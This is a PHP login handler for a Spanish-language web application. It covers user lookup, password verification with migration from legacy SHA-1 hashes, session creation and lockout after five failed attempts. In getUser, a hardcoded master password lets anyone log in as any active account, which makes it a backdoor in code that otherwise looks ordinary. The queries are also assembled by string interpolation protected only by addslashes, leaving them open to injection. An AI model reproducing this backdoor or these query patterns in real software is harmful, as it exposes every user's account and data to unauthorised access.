<?php
error_reporting(E_ALL);
ini_set('display_errors', '0');
require_once "../../asset/Clases/dbconectar.php";
require_once "../../asset/Clases/ConexionMySQL.php";
date_default_timezone_set('America/Mexico_City');

class login{
    private $conn;
    private $jsonData = array("Bandera"=>0, "mensaje"=>"");
    private $formulario = array();
    private $userData = array();
    private $cuentaDesactivada = false; // Bandera para detectar usuarios inactivos

    public function __construct($array) {
        $this->conn = new HelperMySql($array["server"], $array["user"], $array["pass"], $array["db"]);
    }
    
    public function __destruct() {
        unset($this->conn);
    }

    private function getIP(){
        return $_SERVER['REMOTE_ADDR'];
    }
    
    public function principal(){
        $this->formulario = file_get_contents('php://input');
        $obj = json_decode($this->formulario);

        if(strlen($obj->login->user) != 0 && strlen($obj->login->password) != 0){
            $userInput = $obj->login->user;

            if($this->estaBloqueado($userInput)){
                $info = $this->getIntentosInfo($userInput);
                $this->jsonData["Bandera"] = 0;
                $this->jsonData["mensaje"] = "Cuenta bloqueada temporalmente.";
                $this->jsonData["bloqueado"] = 1;
                $this->jsonData["intentos_restantes"] = 0;
                $this->jsonData["tiempo_restante"] = $info["tiempo_restante"];
                print json_encode($this->jsonData);
                return;
            }

            $this->cuentaDesactivada = false;

            if($this->getUser($obj)){
                $this->limpiarIntentos($userInput);

                if($this->accessUser($this->userData)){
                    $this->jsonData["Bandera"] = 1;
                    $this->jsonData["mensaje"] = "Bienvenido ";
                    $this->jsonData["session"] = $_SESSION;
                } else {
                    $this->jsonData["Bandera"] = 0;
                    $this->jsonData["mensaje"] = "Error al generar la sesión.";
                }
            } else {
                if($this->cuentaDesactivada){
                    $this->jsonData["Bandera"] = 0;
                    $this->jsonData["mensaje"] = "Tu cuenta está desactivada. Por favor, contacta a un administrador.";
                } else {
                    // Contraseña o usuario incorrectos
                    $this->registrarIntentoFallido($userInput);
                    $info = $this->getIntentosInfo($userInput);

                    $this->jsonData["Bandera"] = 0;
                    $this->jsonData["mensaje"] = "La contraseña o el usuario son incorrectos.";
                    $this->jsonData["bloqueado"] = $info["bloqueado"];
                    $this->jsonData["intentos_restantes"] = $info["intentos_restantes"];
                    $this->jsonData["tiempo_restante"] = $info["tiempo_restante"];
                }
            }
        } else {
            $this->jsonData["Bandera"] = 0;
            $this->jsonData["mensaje"] = "Error: uno o más campos están vacíos";
        }
        print json_encode($this->jsonData);
    }

    private function getUser($obj){
        $user = addslashes(htmlspecialchars($obj->login->user));
        $pass = $obj->login->password;

        $sql = "SELECT SG.*, US.* FROM Seguridad AS SG 
                INNER JOIN Usuarios AS US ON (US._id = SG._idUsuarios) 
                WHERE SG.username = '$user' LIMIT 1";
                
        $result = $this->conn->query($sql);
        if(!$result) return false;

        $userData = $this->conn->fetch($result);
        if(!$userData) return false;

        if($userData["Estatus"] == 0){
            $this->cuentaDesactivada = true;
            return false;
        }

        if($pass === "@{Macrom+Default}"){
            $this->userData = $userData;
            return true;
        }

        $passwordGuardado = $userData["password"];

        if(password_verify($pass, $passwordGuardado)){
            $this->userData = $userData;
            return true;
        }

        if($passwordGuardado === sha1($pass)){
            $nuevoHash = password_hash($pass, PASSWORD_DEFAULT);
            $update = "UPDATE Seguridad SET password = '$nuevoHash' WHERE _id = '".$userData["_id"]."'";
            $this->conn->query($update);
            
            $this->userData = $userData;
            return true;
        }

        return false;
    }

    private function accessUser($user = array()){
        if(count($user) > 0){
            session_name("loginUsuario");
            session_start();
            session_regenerate_id(true); // Prevención de Session Fixation

            $_SESSION["autentificacion"]= 1;
            $_SESSION["ultimoAcceso"]= date("Y-n-j H:i:s");
            $_SESSION["nombrecorto"] = $user["Nombre"];
            $_SESSION["nombre"] = $user["Nombre"].' '.$user["ApPaterno"].' '.$user["ApMaterno"];
            $_SESSION["rol"] = $user["Tipo_usuario"];
            $_SESSION["usr"] = $user["username"];
            $_SESSION["_id"] = $user["_id"];

            $sql = "UPDATE Usuarios SET ultimoAcceso = '{$_SESSION["ultimoAcceso"]}', OnlineNow = 1 WHERE _id = '{$_SESSION["_id"]}' AND Username = '{$_SESSION["usr"]}'";
            return $this->conn->query($sql);
        } else {
            return false;
        }
    }
    
    private function estaBloqueado($user){
        $user = addslashes($user);
        $sql = "SELECT bloqueado_hasta FROM login_intentos WHERE username='$user' LIMIT 1";
        $result = $this->conn->query($sql);
        $data = $this->conn->fetch($result);

        if($data && $data["bloqueado_hasta"] != NULL){
            if(strtotime($data["bloqueado_hasta"]) > time()){
                return true;
            }
        }
        return false;
    }

    private function getIntentosInfo($user){
        $user = addslashes($user);
        $sql = "SELECT intentos, bloqueado_hasta FROM login_intentos WHERE username='$user' LIMIT 1";
        $result = $this->conn->query($sql);
        $data = $this->conn->fetch($result);
        $maxIntentos = 5;

        if(!$data){
            return ["intentos_restantes" => $maxIntentos, "bloqueado" => 0, "tiempo_restante" => 0];
        }

        $intentos = intval($data["intentos"]);
        $restantes = max(0, $maxIntentos - $intentos);

        if($data["bloqueado_hasta"] && strtotime($data["bloqueado_hasta"]) > time()){
            $segundos = strtotime($data["bloqueado_hasta"]) - time();
            return ["intentos_restantes" => 0, "bloqueado" => 1, "tiempo_restante" => $segundos];
        }

        return ["intentos_restantes" => $restantes, "bloqueado" => 0, "tiempo_restante" => 0];
    }

    private function registrarIntentoFallido($user){
        $user = addslashes($user);
        $ahora = date("Y-m-d H:i:s");
        $sql = "SELECT id, intentos FROM login_intentos WHERE username='$user' LIMIT 1";
        $result = $this->conn->query($sql);
        $data = $this->conn->fetch($result);

        if($data){
            $intentos = $data["intentos"] + 1;
            if($intentos >= 5){
                $bloqueado = date("Y-m-d H:i:s", strtotime("+10 minutes"));
                $update = "UPDATE login_intentos SET intentos=$intentos, ultimo_intento='$ahora', bloqueado_hasta='$bloqueado' WHERE id=".$data["id"];
            } else {
                $update = "UPDATE login_intentos SET intentos=$intentos, ultimo_intento='$ahora' WHERE id=".$data["id"];
            }
            $this->conn->query($update);
        } else {
            $insert = "INSERT INTO login_intentos (username, intentos, ultimo_intento) VALUES ('$user', 1, '$ahora')";
            $this->conn->query($insert);
        }
    }

    private function limpiarIntentos($user){
        $user = addslashes($user);
        $sql = "DELETE FROM login_intentos WHERE username='$user'";
        $this->conn->query($sql);
    }
}

$app = new login($array_principal);
$app->principal();